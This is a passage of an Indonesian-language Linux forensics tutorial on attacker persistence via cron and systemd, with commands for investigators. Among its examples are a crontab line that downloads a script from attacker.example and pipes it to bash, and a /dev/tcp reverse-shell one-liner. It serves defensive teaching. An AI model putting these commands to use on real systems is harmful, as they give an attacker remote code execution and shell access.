## 📌 Daftar Isi — Bab 6

- [Bab 6 — Persistence: Cron, Systemd, Init Scripts, LD_PRELOAD](#bab-6--persistence-cron-systemd-init-scripts-ld_preload)
  - [6.1 Model Mental Persistence di Linux — Big Picture](#61-model-mental-persistence-di-linux--big-picture)
  - [6.2 Persistence Enumeration & Discovery — Workflow](#62-persistence-enumeration--discovery--workflow)
  - [6.3 Cron-Based Persistence](#63-cron-based-persistence)
    - [6.3.1 Struktur File Cron](#631-struktur-file-cron)
    - [6.3.2 Format Syntax Cron — Cara Baca Cepat](#632-format-syntax-cron--cara-baca-cepat)
    - [6.3.3 Checklist User vs System Cron](#633-checklist-user-vs-system-cron)
    - [6.3.4 Teknik Persistence via Cron](#634-teknik-persistence-via-cron)
    - [6.3.5 Artefak Forensik Cron & Permission/Ownership Analysis](#635-artefak-forensik-cron--permissionownership-analysis)
  - [6.4 systemd-Based Persistence](#64-systemd-based-persistence)
    - [6.4.1 Anatomi Unit File](#641-anatomi-unit-file)
    - [6.4.2 Lokasi Unit — System, User, Runtime](#642-lokasi-unit--system-user-runtime)
    - [6.4.3 Persistent vs Runtime State](#643-persistent-vs-runtime-state)
    - [6.4.4 systemd Generators](#644-systemd-generators)
    - [6.4.5 Pola Malicious Service](#645-pola-malicious-service)
    - [6.4.6 systemd Timer sebagai Pengganti Cron Modern](#646-systemd-timer-sebagai-pengganti-cron-modern)
    - [6.4.7 Socket & Path Activation — Trigger Chain](#647-socket--path-activation--trigger-chain)
    - [6.4.8 Drop-in Override (.d/ Directories)](#648-drop-in-override-d-directories)
    - [6.4.9 Dari ExecStart ke File Timeline — Workflow](#649-dari-execstart-ke-file-timeline--workflow)
    - [6.4.10 Forensik systemd](#6410-forensik-systemd)
  - [6.5 Init Scripts (SysV & Legacy)](#65-init-scripts-sysv--legacy)
    - [6.5.1 SysV Init Overview](#651-sysv-init-overview)
    - [6.5.2 Kenapa Masih Relevan](#652-kenapa-masih-relevan)
    - [6.5.3 Forensik Init Script](#653-forensik-init-script)
  - [6.6 Shell & Login-Time Persistence](#66-shell--login-time-persistence)
    - [6.6.1 Shell Startup Files sebagai Persistence](#661-shell-startup-files-sebagai-persistence)
    - [6.6.2 `/etc/profile.d/` — System-wide Startup Hook](#662-etcprofiled--system-wide-startup-hook)
    - [6.6.3 PAM-Based Persistence](#663-pam-based-persistence)
    - [6.6.4 SSH-Based Persistence](#664-ssh-based-persistence)
  - [6.7 LD_PRELOAD & Dynamic Linker Hijacking](#67-ld_preload--dynamic-linker-hijacking)
    - [6.7.1 Konsep Dynamic Linking & LD_PRELOAD](#671-konsep-dynamic-linking--ld_preload)
    - [6.7.2 `/etc/ld.so.preload` vs Environment Variable — Forensic Distinction](#672-etcldsopreload-vs-environment-variable--forensic-distinction)
    - [6.7.3 `ld.so.conf`/`ld.so.conf.d` — Library Path Hijacking](#673-ldsoconfldsoconfd--library-path-hijacking)
    - [6.7.4 setuid/setgid & Keterbatasan LD_PRELOAD](#674-setuidsetgid--keterbatasan-ld_preload)
    - [6.7.5 Forensik LD_PRELOAD](#675-forensik-ld_preload)
  - [6.8 Mekanisme Persistence Lain (Overview Singkat)](#68-mekanisme-persistence-lain-overview-singkat)
  - [6.9 Korelasi Titik Persistence vs Metode Deteksi (Tabel Master)](#69-korelasi-titik-persistence-vs-metode-deteksi-tabel-master)
  - [6.10 Ringkasan Command & Tools Cheat Sheet](#610-ringkasan-command--tools-cheat-sheet)
  - [6.11 Mini Case Study — Workflow Analisa End-to-End](#611-mini-case-study--workflow-analisa-end-to-end)

*(Bab 1: Struktur Linux & Filesystem Dasar. Bab 2: Filesystem Forensics Ext4/XFS. Bab 3: Syslog, Journald & Log Forensics. Bab 4: User, Auth & Shell Artifacts. Bab 5: Browser Forensics Linux.)*

---

## Bab 6 — Persistence: Cron, Systemd, Init Scripts, LD_PRELOAD

> 💡 **Posisi Bab 6 di seri ini:** Bab 1-5 sudah membangun fondasi — struktur filesystem (Bab 1-2), sumber log (Bab 3), state akun/auth (Bab 4), dan aktivitas browser (Bab 5). Bab 6 menjawab pertanyaan berbeda: **"bagaimana attacker memastikan akses mereka bertahan setelah reboot/logout?"** — setara peran Bab 8 di seri Windows (Malware & Persistence Analysis), tapi khusus mekanisme persistence-nya saja; analisis malware/rootkit itu sendiri (payload apa yang dijalankan, bagaimana ia menyembunyikan diri) jadi bab tersendiri setelah ini.

> 📖 **Beberapa bagian sudah "dijanjikan" di Bab 1-4:** Bab 1 §1.2.3 menyebut `/etc/crontab`, `systemd/system/`, dan `ld.so.preload` sebagai lokasi persistence tanpa detail. Bab 3 §3.6.1 membahas **log eksekusi** cron tapi men-defer isi crontab-nya ke sini. Bab 4 §4.12 membahas shell startup file dari sudut history/config, men-defer sudut **persistence**-nya ke sini. Bab 6 menuntaskan semua janji itu — dan sebisa mungkin tidak mengulang apa yang sudah dibahas di bab-bab tersebut, cuma merujuk baliknya.

---

### 6.1 Model Mental Persistence di Linux — Big Picture

**Pengertian & Fungsi:**
Sebelum masuk ke tiap mekanisme, penting punya peta besar dulu — persistence pada dasarnya menjawab satu pertanyaan sederhana: **"kode apa yang dijalankan sistem secara otomatis, dan siapa yang mengontrol daftarnya?"** Attacker menyisipkan diri ke salah satu titik yang sudah dipercaya sistem untuk dieksekusi otomatis.

```
Titik Persistence di Linux (dikelompokkan berdasarkan PEMICU eksekusi)
│
├── BOOT-TIME          ← dijalankan saat sistem boot, sebelum user manapun login
│    ├── systemd service (WantedBy=multi-user.target, dst)     §6.4
│    └── SysV init script (rcX.d)                                §6.5
│
├── SCHEDULED           ← dijalankan berkala sesuai jadwal, terlepas dari aktivitas user
│    ├── cron / crontab                                          §6.3
│    ├── at / batch (one-time)                                    §6.3.5
│    └── systemd timer                                             §6.4.6
│
├── LOGIN/SHELL-TIME     ← dijalankan saat user login atau membuka shell baru
│    ├── Shell startup files (.bashrc, .profile, dst)              §6.6.1
│    ├── /etc/profile.d/                                             §6.6.2
│    ├── PAM hooks                                                    §6.6.3
│    └── SSH (authorized_keys command, ForceCommand)                   §6.6.4
│
├── LIBRARY-LOAD-TIME     ← dijalankan setiap kali BINARY APAPUN dieksekusi (paling "senyap")
│    └── LD_PRELOAD / ld.so.preload / ld.so.conf                        §6.7
│
├── EVENT-TRIGGERED        ← dijalankan saat event sistem tertentu terjadi
│    ├── systemd socket/path activation                                  §6.4.7
│    └── udev rules (device event)                                        §6.8
│
└── APPLICATION-SPECIFIC    ← menumpang mekanisme aplikasi/desktop tertentu
     ├── XDG autostart (desktop environment)                              §6.8
     └── Package manager hooks (apt/dpkg)                                  §6.8
```

| Titik Persistence Linux | Analog Konsep di Windows |
|---|---|
| systemd service (`WantedBy=multi-user.target`) | Windows Service (`Services.msc`, Registry `HKLM\SYSTEM\CurrentControlSet\Services`) |
| cron / systemd timer | Scheduled Task |
| Shell startup file (`.bashrc`) | Registry `Run`/`RunOnce` key |
| `/etc/profile.d/` | Logon Script (Group Policy) |
| PAM hooks | Security Support Provider (SSP) / Password Filter DLL |
| LD_PRELOAD / `ld.so.preload` | DLL Hijacking / AppInit_DLLs |
| systemd socket/path activation | WMI Event Subscription |
| udev rules | Device driver install hook (jarang disalahgunakan setara ini di Windows) |

> 💡 **Kenapa peta ini penting sebelum masuk detail:** Setiap sub-bab berikutnya (§6.3-6.8) pada dasarnya "mengisi" satu kotak di diagram ini. Kalau di tengah investigasi bingung "mekanisme apa lagi yang perlu dicek", kembali ke diagram ini sebagai checklist kategori — bukan daftar teknik individual yang harus dihafal semua.

---

### 6.2 Persistence Enumeration & Discovery — Workflow

**Pengertian & Fungsi:**
Bagian ini menjawab pertanyaan operasional: **dari mana investigator harus mulai**, dan **urutan apa** yang paling efisien untuk cek semua titik di §6.1 tanpa melewatkan satupun. Ini yang membedakan Bab 6 sebagai *workflow forensik*, bukan sekadar katalog teknik.

```
Urutan Enumerasi yang Direkomendasikan:

1. CRON            → paling umum, paling cepat dicek, jejak paling eksplisit (§6.3)
      ↓
2. SYSTEMD          → paling sering dipakai malware modern, butuh cek state selain file (§6.4)
      ↓
3. INIT SCRIPTS      → jarang dipakai di distro modern, tapi cepat dicek, jangan dilewat (§6.5)
      ↓
4. SHELL/LOGIN        → cek per-user, bisa makan waktu kalau banyak akun (§6.6)
      ↓
5. DYNAMIC LINKER      → paling "senyap", butuh effort lebih untuk membuktikan (§6.7)
      ↓
6. UDEV/AUTOSTART/HOOKS  → niche tapi cepat dicek sebagai langkah terakhir (§6.8)
```

> 📌 **Kenapa urutan ini, bukan urutan lain:** Prinsipnya "cek yang paling murah & paling sering dipakai attacker dulu" — cron dan systemd menutup mayoritas kasus persistence Linux di dunia nyata maupun CTF, jadi ditempatkan di awal supaya kalau waktu investigasi terbatas, yang paling bernilai sudah tercakup duluan. LD_PRELOAD ditempatkan hampir di akhir bukan karena tidak penting, tapi karena butuh effort verifikasi lebih besar (§6.7.5) — jangan dicek terburu-buru sebelum titik lain yang lebih murah sudah dituntaskan.

**Prinsip Umum — Berlaku ke SEMUA Mekanisme di Bab Ini:**

Begitu ketemu kandidat artefak persistence (baris crontab mencurigakan, unit file baru, entry `.bashrc` asing, dst), jangan berhenti di "ketemu" — selalu lanjutkan alur berikut:

```
Artefak Persistence Ditemukan
      │
      ▼
  Owner            ← siapa pemilik file? root yang membuat, atau user biasa?
      │
      ▼
  Permission        ← siapa yang bisa tulis/eksekusi? Terlalu longgar (misal 777)?
      │
      ▼
  mtime/ctime         ← kapan dibuat/diubah? (§2.1.2 Bab 2) — cocok dengan window insiden?
      │
      ▼
  Hash                  ← apakah file/binary yang dirujuk cocok dengan hash dikenal
      │                    (baseline sistem, VirusTotal, dst)?
      ▼
  Correlate dengan Log    ← EVTX-nya Linux: journal (Bab 3 §3.4), auditd (Bab 3 §3.5),
                             auth.log — apakah ada entry yang match waktu file ini dibuat?
```

> ⚠️ **Contoh kenapa prinsip ini krusial:** "Ada service baru bernama `backup-sync.service`" itu sendiri **bukan** temuan yang cukup — tapi "service baru bernama `backup-sync.service`, dimiliki `root`, `ExecStart` menunjuk ke **`/tmp/.hidden/agent`** (§1.2.6 Bab 1 — `/tmp` adalah staging area favorit attacker), dibuat 3 menit setelah entry SSH login mencurigakan di `auth.log`" adalah temuan yang solid. Sepanjang Bab 6, alur lima langkah ini akan terus dirujuk balik sebagai "Prinsip Umum §6.2" alih-alih ditulis ulang di tiap sub-bab.

---

### 6.3 Cron-Based Persistence

#### 6.3.1 Struktur File Cron

**Pengertian & Fungsi:**
Cron adalah scheduler tertua & paling universal di Linux — daemon `crond` membaca kumpulan file terjadwal ini secara periodik (biasanya tiap menit) dan menjalankan entry yang jatuh tempo.

```
Sumber Cron di Sistem
│
├── /etc/crontab                     ← crontab system-wide, format 7 kolom (ada kolom USER)
│
├── /etc/cron.d/                      ← direktori drop-in untuk crontab system-wide tambahan
│    └── <nama_paket_atau_custom>       (dipakai banyak paket software untuk install jadwal sendiri)
│
├── /etc/cron.daily/                   ← script dijalankan 1x/hari lewat run-parts (dipanggil dari
├── /etc/cron.hourly/                    /etc/crontab bawaan sistem atau lewat systemd timer
├── /etc/cron.weekly/                    di distro modern — lihat §6.4.6)
├── /etc/cron.monthly/
│
├── /var/spool/cron/crontabs/<user>     ← crontab PER-USER, dibuat lewat `crontab -e`,
│    (path bervariasi: Debian/Ubuntu       TIDAK ada kolom USER (implisit dari nama file)
│     vs RHEL/CentOS beda sedikit)
│
└── anacron (/etc/anacrontab)            ← varian cron yang toleran downtime (laptop/server
                                            yang tidak selalu menyala, "menyusulkan" jadwal
                                            yang terlewat saat sistem hidup lagi)
```

| Lokasi | Siapa yang Bisa Menulis | Butuh Kolom USER? |
|---|---|---|
| `/etc/crontab` | root only | ✅ Ya |
| `/etc/cron.d/*` | root only | ✅ Ya |
| `/etc/cron.{daily,hourly,weekly,monthly}/*` | root only | ❌ (dijalankan sebagai root oleh run-parts) |
| `/var/spool/cron/crontabs/<user>` | User itu sendiri (lewat `crontab -e`) atau root | ❌ (implisit dari nama file) |

> 📖 **Cross-reference:** Lokasi-lokasi ini sudah disebut sekilas di Bab 1 §1.2.3 dan §1.2.11 (tabel prioritas investigasi) — bagian ini yang memenuhi janji pembahasan detailnya.

---

#### 6.3.2 Format Syntax Cron — Cara Baca Cepat

```
┌───────────── menit (0-59)
│ ┌───────────── jam (0-23)
│ │ ┌───────────── tanggal bulan (1-31)
│ │ │ ┌───────────── bulan (1-12)
│ │ │ │ ┌───────────── hari dalam minggu (0-6, 0=Minggu)
│ │ │ │ │
* * * * *  [user, HANYA di /etc/crontab & /etc/cron.d/]  command_to_run
```

| Simbol | Arti | Contoh |
|---|---|---|
| `*` | Setiap nilai | `* * * * *` = tiap menit |
| `*/N` | Tiap N interval | `*/5 * * * *` = tiap 5 menit |
| `,` | Daftar nilai spesifik | `0 9,17 * * *` = jam 9 pagi dan 5 sore |
| `-` | Rentang | `0 9-17 * * *` = tiap jam, dari jam 9 sampai 17 |
| `@reboot` | Sekali saat boot (bukan jadwal berkala) | `@reboot /path/to/script.sh` |

```bash
# Contoh baris mencurigakan di /etc/crontab (perhatikan kolom USER ada di sini)
*/5 * * * * root curl -s http://attacker.example/beacon.sh | bash

# Contoh di crontab user (TANPA kolom USER, karena nama file = username-nya)
@reboot /home/user/.local/bin/update-checker
```

> ⚠️ **`@reboot` sering luput dari perhatian:** Baris `@reboot` tidak "terlihat aktif" saat investigator cuma cek proses berjalan (`ps aux`) di antara waktu reboot — dia cuma jalan **sekali** tepat saat boot. Selalu cek isi file mentahnya (bukan cuma proses live) untuk menangkap entry semacam ini.

---

#### 6.3.3 Checklist User vs System Cron

**Pengertian & Fungsi:**
Kesalahan paling umum investigator yang baru pindah ke Linux forensics adalah **berhenti setelah cek `/etc/crontab`**, padahal itu cuma satu dari beberapa sumber jadwal yang independen satu sama lain. Checklist berikut wajib dijalankan **semuanya**, bukan pilih salah satu.

```bash
# [1] Crontab system-wide utama
cat /etc/crontab

# [2] Drop-in system-wide tambahan (SERING TERLEWAT — banyak paket taruh jadwal sendiri di sini,
#     dan attacker tahu ini juga tempat yang jarang dicek manual)
ls -la /etc/cron.d/
cat /etc/cron.d/*

# [3] Script periodik (dijalankan run-parts, isinya SCRIPT, bukan satu baris command)
ls -la /etc/cron.daily/ /etc/cron.hourly/ /etc/cron.weekly/ /etc/cron.monthly/

# [4] Crontab PER-USER — WAJIB dicek untuk SETIAP user di /etc/passwd (Bab 4 §4.2),
#     TERMASUK user yang sudah tidak aktif/disabled shell-nya (Bab 4 §4.2.3)
for user in $(cut -f1 -d: /etc/passwd); do
    echo "=== crontab milik $user ==="
    sudo crontab -l -u "$user" 2>/dev/null
done

# Alternatif langsung baca file mentah (menangkap kasus edge tertentu yang kadang
# tidak muncul lewat 'crontab -l', misal file dimodifikasi manual di luar 'crontab -e')
sudo ls -la /var/spool/cron/crontabs/          # Debian/Ubuntu
sudo ls -la /var/spool/cron/                    # RHEL/CentOS

# [5] anacron — jangan lupakan varian ini terutama untuk laptop/mesin yang sering mati-nyala
cat /etc/anacrontab

# [6] at/batch — one-time scheduled job (§6.3.5), TERPISAH TOTAL dari sistem cron biasa
atq
```

| Checklist | Perintah Kunci | Kenapa Sering Terlewat |
|---|---|---|
| `/etc/crontab` | `cat /etc/crontab` | — (paling sering dicek, jarang terlewat) |
| `/etc/cron.d/` | `cat /etc/cron.d/*` | Dikira "punya paket resmi doang", padahal attacker bisa buat file baru di sini |
| `cron.{daily,hourly,...}` | `ls -la /etc/cron.daily/` | Isinya script, investigator kadang cuma cek `/etc/crontab` yang MEMANGGIL run-parts, lupa cek isi script yang dipanggil |
| **`crontab -l -u <user>`** | Loop semua user di `/etc/passwd` | **Paling sering terlewat** — investigator sering cuma cek file system-wide, lupa tiap user punya crontab sendiri yang terpisah |
| anacron | `cat /etc/anacrontab` | Dianggap "cuma cron biasa", padahal file & mekanismenya terpisah |
| `at`/`batch` | `atq` | Dianggap bagian dari cron, padahal daemon (`atd`) & storage-nya (`/var/spool/at/`) berbeda total |

> ⚠️ **Kenapa loop per-user itu WAJIB, bukan opsional:** `crontab -l` tanpa `-u` cuma menunjukkan crontab milik user yang sedang menjalankan command tsb. Kalau investigator jalan sebagai root tapi lupa loop ke semua user, crontab milik user biasa (misal `www-data` atau user hasil kompromi) akan **sepenuhnya terlewat** — dan ini justru lokasi favorit attacker karena tidak butuh privilege root untuk membuatnya.

---

#### 6.3.4 Teknik Persistence via Cron

| Teknik | Cara Kerja | Deteksi |
|---|---|---|
| **Reverse shell terjadwal** | Cron entry yang periodik membuka koneksi balik ke attacker (`bash -i >& /dev/tcp/IP/PORT 0>&1`) | Command line mencurigakan di isi crontab, korelasi ke koneksi jaringan periodik |
| **Download & eksekusi (dropper)** | `curl`/`wget` payload lalu eksekusi, sering dengan interval pendek (`*/5 * * * *`) supaya "self-healing" kalau payload dihapus manual | Command line berisi URL eksternal + pipe ke shell (`| bash`, `| sh`) |
| **Hidden character / trik whitespace** | Menyisipkan karakter tidak terlihat (tab berlebih, trailing whitespace) di baris crontab supaya terlewat saat `grep`/scan visual cepat | `cat -A` untuk menampilkan karakter non-printable |
| **Comment trick** | Baris cron disamarkan seolah komentar/config biasa milik software legit (`# updated by system-maintenance`) padahal command-nya berbahaya | Baca isi PENUH tiap baris, jangan cuma scan berdasarkan pola "kelihatan mencurigakan" |
| **Nama file menyamar** | File di `/etc/cron.d/` diberi nama seperti paket resmi (`apt-daily-custom`, `logrotate-fix`) | Bandingkan nama file dengan daftar paket terinstal (`dpkg -l`/`rpm -qa`) — kalau tidak cocok paket manapun, patut dicurigai |

```bash
# Cek karakter tersembunyi di file crontab
cat -A /etc/crontab

# Bandingkan isi cron.d dengan paket resmi yang terinstal
ls /etc/cron.d/
dpkg -l | grep -i <nama_file_mencurigakan>    # Debian/Ubuntu
rpm -qa | grep -i <nama_file_mencurigakan>     # RHEL/CentOS
```

---

#### 6.3.5 Artefak Forensik Cron & Permission/Ownership Analysis

Menerapkan **Prinsip Umum §6.2** secara spesifik ke cron:

```bash
# Owner & permission SEMUA sumber cron sekaligus
stat /etc/crontab
sudo find /etc/cron.d/ /etc/cron.daily/ /etc/cron.hourly/ -exec stat {} \;
sudo find /var/spool/cron -exec stat {} \; 2>/dev/null

# mtime/ctime untuk timeline — file cron yang dimodifikasi BARU-BARU INI di sistem
# yang sudah lama berjalan adalah sinyal kuat
sudo find /etc/cron.d/ /etc/crontab -newer /etc/hostname    # contoh: lebih baru dari file referensi lama
```

> 📖 **Cross-reference ke Bab 3:** Isi crontab menunjukkan **apa yang DIJADWALKAN** — untuk verifikasi apakah jadwal itu benar-benar **DIEKSEKUSI**, korelasikan ke log eksekusi cron (`CRON` entry di `syslog` atau `cron.log`) yang sudah dibahas di Bab 3 §3.6.1. Kombinasi keduanya (isi jadwal + bukti eksekusi) jauh lebih kuat daripada isi crontab saja — bisa jadi entry sudah ditambahkan tapi belum sempat/gagal dieksekusi.

> ⚠️ **Sinyal kuat sesuai Prinsip Umum §6.2:** Entry cron yang dimiliki `root`, dibuat/dimodifikasi (`mtime`) di luar jadwal maintenance rutin sistem, memanggil binary/script di lokasi tidak standar (`/tmp`, `/dev/shm`, `/var/tmp` — Bab 1 §1.2.6), adalah kombinasi paling umum ditemukan pada kasus nyata maupun CTF.

---

### 6.4 systemd-Based Persistence

> 💡 **Kenapa section ini paling gemuk di Bab 6:** systemd adalah init system default hampir semua distro modern (Bab 1 §1.1.7) — dan justru karena fleksibilitasnya (unit file, generator, drop-in override, activation lewat socket/path), permukaan yang bisa disalahgunakan attacker jauh lebih luas dibanding cron yang relatif sederhana. Memahami systemd **secara mendalam** dari sudut forensik adalah investasi waktu paling bernilai di bab ini.

#### 6.4.1 Anatomi Unit File

**Pengertian & Fungsi:**
Unit file adalah file konfigurasi berformat INI-like yang mendefinisikan sesuatu yang systemd kelola — paling relevan untuk persistence adalah tipe `.service` (proses/daemon), `.timer` (penjadwalan, §6.4.6), `.socket` dan `.path` (activation berbasis event, §6.4.7).

```ini
# Contoh unit file .service — /etc/systemd/system/backup-sync.service
[Unit]
Description=Backup Synchronization Service
After=network.target

[Service]
Type=simple
ExecStart=/usr/local/bin/backup-sync
Environment=API_KEY=abc123
EnvironmentFile=-/etc/backup-sync/env
Restart=always
User=root

[Install]
WantedBy=multi-user.target
```

| Section | Field Kunci | Nilai Forensik |
|---|---|---|
| `[Unit]` | `Description`, `After`, `Requires` | Deskripsi bisa menyamar legit; `After`/`Requires` menunjukkan dependency yang bisa mengindikasikan tujuan sebenarnya |
| `[Service]` | **`ExecStart`** | **Field paling penting** — binary/script apa yang benar-benar dijalankan (§6.4.9) |
| `[Service]` | `User` | Berjalan sebagai siapa — `root` jauh lebih berbahaya dari user biasa |
| `[Service]` | `Restart=always` | Memastikan proses "menghidupkan diri lagi" kalau di-kill manual — pola khas persistence yang resilient |
| `[Service]` | **`Environment=`** | Variabel environment inline — bisa menyembunyikan payload/konfigurasi kecil (`Environment=PAYLOAD_URL=...`) |
| `[Service]` | **`EnvironmentFile=`** | Merujuk ke file eksternal berisi variabel environment — **tidak terlihat langsung** dari isi unit file sendiri, harus dicek terpisah |
| `[Install]` | `WantedBy` | Target mana yang memicu unit ini aktif saat boot (§6.4.3) |

> ⚠️ **`EnvironmentFile=` adalah blind spot umum:** Investigator yang cuma membaca isi `.service` tanpa menelusuri `EnvironmentFile=` bisa melewatkan konfigurasi/kredensial/payload yang sengaja dipisah attacker ke file lain (kadang di lokasi tersembunyi) supaya tidak langsung terlihat saat `cat` unit file utamanya. **Selalu** telusuri file yang dirujuk `EnvironmentFile=` sebagai langkah wajib, bukan opsional.

```bash
# Kalau ketemu EnvironmentFile=, WAJIB cek isinya juga
grep "EnvironmentFile" /etc/systemd/system/*.service
cat /path/yang/dirujuk/env
```

---

#### 6.4.2 Lokasi Unit — System, User, Runtime

**Pengertian & Fungsi:**
Unit file systemd tidak cuma hidup di satu lokasi — ada **tiga tingkat** dengan cakupan dan prioritas berbeda. Menemukan `.service` di satu lokasi **tidak otomatis** berarti sudah mencakup semua kemungkinan.

```
Prioritas Loading (dari yang PALING DIUTAMAKAN kalau ada konflik nama):

/etc/systemd/system/            ← ADMIN-MANAGED, SYSTEM-WIDE (prioritas tertinggi)
   (unit custom, override manual oleh admin/attacker — paling sering jadi lokasi persistence)

/run/systemd/system/             ← RUNTIME, SYSTEM-WIDE
   (dibuat DINAMIS saat runtime — termasuk oleh generator, §6.4.4 — HILANG saat reboot
    kecuali dibuat ulang generator setiap boot)

/usr/lib/systemd/system/          ← PACKAGE-MANAGED, SYSTEM-WIDE (prioritas terendah)
   (dipasang package manager resmi — biasanya "baseline" bawaan distro/software)

~/.config/systemd/user/            ← ADMIN-MANAGED, PER-USER  ⭐ SERING TERLEWAT
   (unit yang berjalan dalam scope USER tertentu, TIDAK BUTUH ROOT untuk dibuat)

/usr/lib/systemd/user/              ← PACKAGE-MANAGED, PER-USER (baseline aplikasi user)
```

| Lokasi | Scope | Butuh Root? | Nilai Forensik |
|---|---|---|---|
| `/etc/systemd/system/` | System-wide | ✅ Ya | Lokasi paling umum untuk persistence attacker yang sudah dapat privilege root |
| `/run/systemd/system/` | System-wide, runtime-only | Tergantung | Unit di sini **tidak akan ditemukan** kalau investigator cuma cek disk image mati (Bab 1 §1.2.12 — konsep persistent vs volatile) — HANYA terlihat di sistem live |
| `/usr/lib/systemd/system/` | System-wide, package baseline | ✅ Ya (untuk modifikasi) | Modifikasi di sini (bukan bikin baru) kadang lebih "menyamar" karena terlihat seperti bagian sistem asli |
| **`~/.config/systemd/user/`** | **Per-user** | **❌ TIDAK** | **Titik paling krusial yang sering terlewat** — attacker yang cuma dapat akses user biasa (belum privilege escalation) tetap bisa pasang persistence lewat sini |

> ⚠️ **Kenapa `~/.config/systemd/user/` layak jadi salah satu prioritas tertinggi di checklist:** Berbeda dari kebanyakan mekanisme persistence lain di bab ini yang butuh privilege root (cron system-wide, systemd system service, init script), unit user-level **tidak butuh privilege sama sekali** — cukup akses shell sebagai user biasa. Ini artinya kompromi awal yang "cuma" dapat akses user rendah **tetap** bisa establish persistence penuh, tanpa perlu privilege escalation dulu. Investigator yang skip pengecekan ini karena beranggapan "belum ada privesc, jadi belum ada persistence" akan melewatkan kasus yang sebenarnya cukup umum.

```bash
# Cek SEMUA lokasi unit sekaligus (system + user, termasuk yang di-enable per-user)
sudo find /etc/systemd/system /run/systemd/system /usr/lib/systemd/system -name "*.service" -newer /etc/hostname

# WAJIB: cek unit user-level untuk SETIAP user (bukan cuma user yang sedang login)
for home in /home/*; do
    user=$(basename "$home")
    echo "=== systemd user units milik $user ==="
    find "$home/.config/systemd/user/" -type f 2>/dev/null
done

# Cek user unit yang enabled (perlu dijalankan dalam konteks user tsb, atau via loginctl)
sudo -u <username> systemctl --user list-unit-files
```

---

#### 6.4.3 Persistent vs Runtime State

**Pengertian & Fungsi:**
Ini bagian **paling penting** dari seluruh §6.4 — menemukan file `.service` **belum menjawab** pertanyaan paling krusial: apakah unit ini benar-benar **aktif** dan akan **otomatis jalan lagi** setelah reboot, atau cuma file sisa yang tidak berpengaruh? systemd punya konsep **state** yang independen dari sekadar "file-nya ada".

```
Enabled State (menentukan apakah unit AKAN dijalankan otomatis saat boot/trigger):

enabled     → Unit AKAN dijalankan otomatis (ada symlink di direktori *.wants/)
disabled     → Unit TIDAK akan dijalankan otomatis (tapi bisa dijalankan manual: systemctl start)
static        → Unit TIDAK BISA di-enable/disable (tidak punya section [Install]) — cuma bisa
                 dijalankan sebagai dependency unit lain, atau manual
masked         → Unit SENGAJA DIBLOKIR total — symlink ke /dev/null, bahkan 'systemctl start'
                  manual pun akan GAGAL. Sering dipakai admin untuk mencegah service tertentu
                  jalan sama sekali (termasuk oleh dependency)
generated       → Unit dibuat OTOMATIS oleh generator (§6.4.4) saat boot, bukan file statis
                    yang sengaja dibuat siapapun
transient        → Unit dibuat DINAMIS lewat API (systemd-run, dst), TIDAK PUNYA file unit
                     sama sekali di disk — hanya ada di memori/runtime selama proses berjalan
```

```bash
# Cek state SEMUA unit sekaligus
systemctl list-unit-files --type=service

# Cek state satu unit spesifik secara detail
systemctl status backup-sync.service
systemctl is-enabled backup-sync.service
systemctl is-active backup-sync.service
```

| State | File Unit Ada di Disk? | Symlink di `*.wants/`? | Jalan Otomatis Saat Boot? |
|---|---|---|---|
| `enabled` | ✅ Ya | ✅ Ya | ✅ Ya |
| `disabled` | ✅ Ya | ❌ Tidak | ❌ Tidak (kecuali dependency unit lain) |
| `static` | ✅ Ya | Tidak relevan (tidak punya `[Install]`) | Hanya kalau jadi dependency |
| `masked` | Symlink ke `/dev/null` | — | ❌ Tidak, bahkan manual pun gagal |
| `generated` | ✅ Ya, tapi di `/run/systemd/generator/` (runtime) | Bervariasi | Tergantung sumber konfigurasi asal generator |
| `transient` | ❌ **Tidak ada file sama sekali** | — | Hanya selama proses berjalan, hilang setelah proses selesai/reboot |

> ⚠️ **Konsekuensi paling penting untuk investigasi:** Menemukan file `.service` mencurigakan **tidak cukup** — kalau state-nya `disabled`, itu mungkin cuma sisa yang tidak pernah benar-benar berpengaruh (atau sedang "ditaruh" attacker untuk diaktifkan nanti). Sebaliknya, unit `transient` **tidak akan pernah ditemukan** lewat pencarian file di disk sama sekali — investigator harus cek `systemctl list-units` di **sistem live** untuk menangkapnya, karena begitu proses selesai/mesin reboot, jejaknya hilang total (konsisten dengan prinsip volatile Bab 1 §1.2.12).

```bash
# Deteksi unit transient (HANYA terlihat di sistem live, tidak ada file-nya)
systemctl list-units --type=service --state=running | grep -v "\.service "
# (unit transient biasanya muncul dengan nama auto-generated seperti "run-u1234.service")

# Cek "symlink enable" secara langsung — cara paling eksplisit verifikasi enabled state
ls -la /etc/systemd/system/multi-user.target.wants/
ls -la /etc/systemd/system/*.target.wants/
```

---

#### 6.4.4 systemd Generators

**Pengertian & Fungsi:**
Generator adalah executable yang dijalankan systemd **sangat awal** saat boot (sebelum unit biasa diproses) untuk **membuat unit secara dinamis** berdasarkan sumber konfigurasi lain — contoh built-in: `fstab-generator` yang mengubah entry `/etc/fstab` (Bab 1 §1.1.12) jadi unit mount otomatis.

```
Sumber Konfigurasi Lain          Generator                    Unit Dinamis (di /run/systemd/generator/)
────────────────────              ─────────                     ──────────────────────────────────────
/etc/fstab              ────►    fstab-generator     ────►     <mount-point>.mount

/etc/crypttab            ────►    cryptsetup-generator ────►     <device>.service

Custom generator script    ────►   (di /usr/lib/systemd/         Unit APAPUN yang di-generate
(ditaruh attacker)                  system-generators/)           script custom tersebut
```

> ⚠️ **Kenapa ini relevan untuk forensik:** `systemctl list-unit-files` menampilkan unit **statis** (yang benar-benar punya file di lokasi standar §6.4.2), tapi unit yang **dihasilkan generator** muncul di `/run/systemd/generator/` — kadang tidak langsung "terasa" sebagai hasil generator kalau investigator tidak familiar konsepnya, terutama kalau attacker menaruh **generator script custom** sendiri di `/usr/lib/systemd/system-generators/` (atau `/etc/systemd/system-generators/`) yang menghasilkan unit persistence secara dinamis **setiap kali boot** — teknik yang cukup canggih karena unit hasil generate tidak "menetap" sebagai file statis yang mudah ditemukan lewat pencarian file biasa.

```bash
# Cek generator yang terpasang di sistem (built-in maupun custom)
ls -la /usr/lib/systemd/system-generators/
ls -la /etc/systemd/system-generators/       # custom, prioritas lebih tinggi dari lokasi di atas
ls -la /run/systemd/system-generators/        # custom, runtime-installed

# Cek HASIL generate dari generator (unit dinamis, hanya ada di sistem live)
ls -la /run/systemd/generator/
ls -la /run/systemd/generator.late/
```

